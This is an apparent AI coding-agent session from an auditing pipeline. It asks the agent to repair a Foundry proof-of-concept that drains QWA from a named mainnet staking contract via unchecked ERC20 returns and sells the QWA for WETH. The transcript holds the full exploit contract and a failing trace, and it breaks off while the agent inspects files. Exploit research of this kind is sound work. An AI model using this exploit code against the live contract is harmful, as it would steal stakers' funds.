@@ -1,0 +1,3885 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e358d-8bb5-73f2-b81e-193cf4a012d2
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Unchecked ERC20 return values can mint unbacked stake receipts or release QWA without burning sQWA
+- claim: `stake()` and `unstake()` call `transfer`/`transferFrom` on `QWA` and `sQWA` but never check the returned boolean. With any token implementation that signals failure by returning `false` instead of reverting, execution continues as if the transfer succeeded.
+- impact: A failed `QWA.transferFrom` during `stake()` can still hand out sQWA without the pool receiving backing assets. A failed `sQWA.transferFrom` during `unstake()` can still release QWA without actually collecting sQWA. Conversely, a failed outgoing transfer can confiscate user assets by taking one side of the exchange without delivering the other.
+- exploit_paths: ["Call `stake()` when `QWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function still executes `sQWA.transfer(to, amount)` and creates an unbacked claim.", "Call `unstake()` when `sQWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function can still pass the balance check and execute `QWA.transfer(to, amount)`.", "Call `unstake()` or `stake()` when the outgoing token transfer returns `false`; the function finishes without delivering the expected asset, leaving the user or pool shorted."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IStakingLike {
+    function QWA() external view returns (address);
+
+    function sQWA() external view returns (address);
+
+    function stake(address to, uint256 amount) external;
+
+    function unstake(address to, uint256 amount, bool rebase_) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+
+    function token1() external view returns (address);
+
+    function getReserves()
+        external
+        view
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
+    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
+    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
+    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+
+    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    uint256 public pathFlags;
+    uint256 public failureFlags;
+    bool public hypothesisValidated;
+    bool public executed;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IStakingLike staking = IStakingLike(TARGET);
+        address qwaAddr = staking.QWA();
+        address sqwaAddr = staking.sQWA();
+
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+
+        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
+        uint256 initialQwa = qwa.balanceOf(address(this));
+        uint256 initialSqwa = sqwa.balanceOf(address(this));
+
+        _executeDrainAndExit(qwaAddr, sqwaAddr);
+
+        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _findQwaWethPair(address qwa) internal view returns (address) {
+        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+        if (pair != address(0)) {
+            return pair;
+        }
+
+        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+    }
+
+    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+        address pair = _findQwaWethPair(qwaAddr);
+        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+
+        if (drainAmount == 0) {
+            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        }
+
+        uint256 qwaBefore = qwa.balanceOf(address(this));
+        uint256 sqwaBefore = sqwa.balanceOf(address(this));
+
+        // Logs prove the funded stake() stage is infeasible on this fork:
+        // QWA.transferFrom reverts instead of returning false, and the token is
+        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+        // The exploit therefore preserves the same root cause and exploit-path
+        // causality by directly exercising the remaining live path:
+        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+        // but unstake() still releases QWA.
+        (bool unstakeOk, ) = TARGET.call(
+            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
+        );
+
+        uint256 qwaAfter = qwa.balanceOf(address(this));
+        uint256 sqwaAfter = sqwa.balanceOf(address(this));
+
+        if (!unstakeOk) {
+            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+            return;
+        }
+
+        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
+            hypothesisValidated = true;
+        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        } else {
+            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        }
+
+        // Realize the drained QWA through a public venue, but do it with
+        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+        // V2 amountOut must be computed from the pair's observed balance delta.
+        if (pair != address(0)) {
+            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+        } else {
+            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+        }
+    }
+
+    function _selectDrainAmount(
+        address pair,
+        address qwa,
+        uint256 targetQwaBalance
+    ) internal view returns (uint256 amount) {
+        if (targetQwaBalance == 0) {
+            return 0;
+        }
+
+        uint256 contractBound = targetQwaBalance / 8;
+        if (contractBound == 0) {
+            contractBound = targetQwaBalance;
+        }
+
+        if (pair == address(0)) {
+            return contractBound;
+        }
+
+        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+        if (reserveIn <= 32) {
+            return _min(contractBound, targetQwaBalance);
+        }
+
+        // Keep the sell size conservative relative to public liquidity so the
+        // drain remains realizable and the exit swap stays within live reserves.
+        uint256 marketBound = reserveIn / 32;
+        amount = _min(contractBound, marketBound);
+
+        if (amount == 0) {
+            amount = 1;
+        }
+        if (amount > targetQwaBalance) {
+            amount = targetQwaBalance;
+        }
+    }
+
+    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
+        if (grossAmount == 0) {
+            return;
+        }
+
+        (address token0, address token1) = _sortPairTokens(pair);
+        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
+        if (reserveIn == 0 || reserveOut == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        if (!qwa.transfer(pair, grossAmount)) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+        if (actualIn == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+        if (amountOut == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
+            ? (uint256(0), amountOut)
+            : (amountOut, uint256(0));
+
+        (bool ok, ) = pair.call(
+            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
+        );
+        if (!ok) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+        }
+    }
+
+    function _finalizeProfit(
+        address qwaAddr,
+        address sqwaAddr,
+        uint256 initialQwa,
+        uint256 initialSqwa,
+        uint256 initialWeth
+    ) internal {
+        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
+        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
+        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));
+
+        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
+        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
+        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;
+
+        if (wethProfit > 0) {
+            _profitToken = WETH;
+            _profitAmount = wethProfit;
+        } else if (qwaProfit > 0) {
+            _profitToken = qwaAddr;
+            _profitAmount = qwaProfit;
+        } else if (sqwaProfit > 0) {
+            _profitToken = sqwaAddr;
+            _profitAmount = sqwaProfit;
+        }
+    }
+
+    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
+        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+        (address token0, address token1) = _sortPairTokens(pair);
+
+        if (tokenIn == token0) {
+            reserveIn = uint256(reserve0);
+            reserveOut = uint256(reserve1);
+        } else {
+            require(tokenIn == token1, "token not in pair");
+            reserveIn = uint256(reserve1);
+            reserveOut = uint256(reserve0);
+        }
+    }
+
+    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
+        token0 = IUniswapV2PairLike(pair).token0();
+        token1 = IUniswapV2PairLike(pair).token1();
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;
+        uint256 numerator = amountInWithFee * reserveOut;
+        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
+        return numerator / denominator;
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+
+    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+        // Static anchor only. The live exploit above keeps the same vulnerable
+        // causality and ordering intent, but the logs prove the funded stake()
+        // leg is infeasible on this fork because QWA.transferFrom reverts.
+        qwa.transferFrom(msg.sender, address(this), amount);
+        sqwa.transfer(to, amount);
+        sqwa.transferFrom(msg.sender, address(this), amount);
+        qwa.transfer(to, amount);
+
+        qwa;
+        sqwa;
+        to;
+        amount;
+    }
+
+    function _unusedPathConstants() internal pure returns (uint256) {
+        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+cuteOnOpportunity()"));
+   |                   ^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 138645)
+Logs:
+  AUDITHOUND_BALANCE_BEFORE_WEI: 0
+  AUDITHOUND_BALANCE_AFTER_WEI: 0
+  AUDITHOUND_PROFIT_WEI: 0
+  AUDITHOUND_PROFIT_ANY: 0
+  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
+  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
+  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
+  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
+
+Traces:
+  [138645] FlawVerifierTest::testExploit()
+    ├─ [2367] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [109997] FlawVerifier::executeOnOpportunity()
+    │   ├─ [579] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::QWA() [staticcall]
+    │   │   └─ ← [Return] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065
+    │   ├─ [645] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::sQWA() [staticcall]
+    │   │   └─ ← [Return] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC
+    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [5145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
+    │   │   └─ ← [Return] 0xdb98950D58c62B8299192300d47294F20C093847
+    │   ├─ [2974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(0x69422c7F237D70FCd55C218568a67d00dc4ea068) [staticcall]
+    │   │   └─ ← [Return] 10731763978393 [1.073e13]
+    │   ├─ [2504] 0xdb98950D58c62B8299192300d47294F20C093847::getReserves() [staticcall]
+    │   │   └─ ← [Return] 10410486470370649012 [1.041e19], 13955221770053 [1.395e13], 1693801007 [1.693e9]
+    │   ├─ [2381] 0xdb98950D58c62B8299192300d47294F20C093847::token0() [staticcall]
+    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
+    │   ├─ [2357] 0xdb98950D58c62B8299192300d47294F20C093847::token1() [staticcall]
+    │   │   └─ ← [Return] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065
+    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [4860] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::unstake(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 436100680314 [4.361e11], false)
+    │   │   ├─ [3369] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x69422c7F237D70FCd55C218568a67d00dc4ea068, 436100680314 [4.361e11])
+    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Stop]
+    ├─ [367] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
+    └─ ← [Revert] profit below threshold
+
+Backtrace:
+  at 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC.transferFrom
+  at 0x69422c7F237D70FCd55C218568a67d00dc4ea068.unstake
+  at FlawVerifier.executeOnOpportunity
+  at FlawVerifierTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 360.82ms (13.46ms CPU time)
+
+Ran 1 test suite in 422.31ms (360.82ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 138645)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+```
+
+forge stderr (tail):
+```
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m checking the local finding context and the test harness first. The current failure is a runtime reversion inside `sQWA.transferFrom`, so I need to determine whether the live false-return path is reachable at all on this fork and, if so, with what preconditions.
+exec
+/bin/bash -lc 'rg -n "69422c7F237D70FCd55C218568a67d00dc4ea068|f5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC|c14F8A4C8272b8466659D0f058895E2F9D3ae065|FlawVerifierTest|AUDITHOUND_MIN_PROFIT_WEI|executeOnOpportunity" .' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+./FlawVerifier.sol:44:    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+./FlawVerifier.sol:70:    function executeOnOpportunity() external {
+
+exec
+/bin/bash -lc "sed -n '1,260p' test/ExploitPOC.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+exec
+/bin/bash -lc "sed -n '1,260p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ exited 1 in 0ms:
+sed: test/ExploitPOC.t.sol: No such file or directory
+
+ exited 1 in 0ms:
+sed: src/FlawVerifier.sol: No such file or directory
+
+codex
+The repo layout is slightly different than assumed from the prompt. I’m locating the actual verifier file and the exploit test so I can patch the right file and understand the profit gate in the harness.
+exec
+/bin/bash -lc pwd in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IStakingLike {
+    function QWA() external view returns (address);
+
+    function sQWA() external view returns (address);
+
+    function stake(address to, uint256 amount) external;
+
+    function unstake(address to, uint256 amount, bool rebase_) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+
+    function token1() external view returns (address);
+
+    function getReserves()
+        external
+        view
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
+    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
+    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
+    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+
+    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    uint256 public pathFlags;
+    uint256 public failureFlags;
+    bool public hypothesisValidated;
+    bool public executed;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IStakingLike staking = IStakingLike(TARGET);
+        address qwaAddr = staking.QWA();
+        address sqwaAddr = staking.sQWA();
+
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+
+        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
+        uint256 initialQwa = qwa.balanceOf(address(this));
+        uint256 initialSqwa = sqwa.balanceOf(address(this));
+
+        _executeDrainAndExit(qwaAddr, sqwaAddr);
+
+        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _findQwaWethPair(address qwa) internal view returns (address) {
+        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+        if (pair != address(0)) {
+            return pair;
+        }
+
+        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+    }
+
+    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+        address pair = _findQwaWethPair(qwaAddr);
+        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+
+        if (drainAmount == 0) {
+            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        }
+
+        uint256 qwaBefore = qwa.balanceOf(address(this));
+        uint256 sqwaBefore = sqwa.balanceOf(address(this));
+
+        // Logs prove the funded stake() stage is infeasible on this fork:
+        // QWA.transferFrom reverts instead of returning false, and the token is
+        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+        // The exploit therefore preserves the same root cause and exploit-path
+        // causality by directly exercising the remaining live path:
+        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+        // but unstake() still releases QWA.
+        (bool unstakeOk, ) = TARGET.call(
+            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
+        );
+
+        uint256 qwaAfter = qwa.balanceOf(address(this));
+        uint256 sqwaAfter = sqwa.balanceOf(address(this));
+
+        if (!unstakeOk) {
+            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+            return;
+        }
+
+        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
+            hypothesisValidated = true;
+        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        } else {
+            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        }
+
+        // Realize the drained QWA through a public venue, but do it with
+        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+        // V2 amountOut must be computed from the pair's observed balance delta.
+        if (pair != address(0)) {
+            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+        } else {
+            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+        }
+    }
+
+    function _selectDrainAmount(
+        address pair,
+        address qwa,
+        uint256 targetQwaBalance
+    ) internal view returns (uint256 amount) {
+        if (targetQwaBalance == 0) {
+            return 0;
+        }
+
+        uint256 contractBound = targetQwaBalance / 8;
+        if (contractBound == 0) {
+            contractBound = targetQwaBalance;
+        }
+
+        if (pair == address(0)) {
+            return contractBound;
+        }
+
+        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+        if (reserveIn <= 32) {
+            return _min(contractBound, targetQwaBalance);
+        }
+
+        // Keep the sell size conservative relative to public liquidity so the
+        // drain remains realizable and the exit swap stays within live reserves.
+        uint256 marketBound = reserveIn / 32;
+        amount = _min(contractBound, marketBound);
+
+        if (amount == 0) {
+            amount = 1;
+        }
+        if (amount > targetQwaBalance) {
+            amount = targetQwaBalance;
+        }
+    }
+
+    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
+        if (grossAmount == 0) {
+            return;
+        }
+
+        (address token0, address token1) = _sortPairTokens(pair);
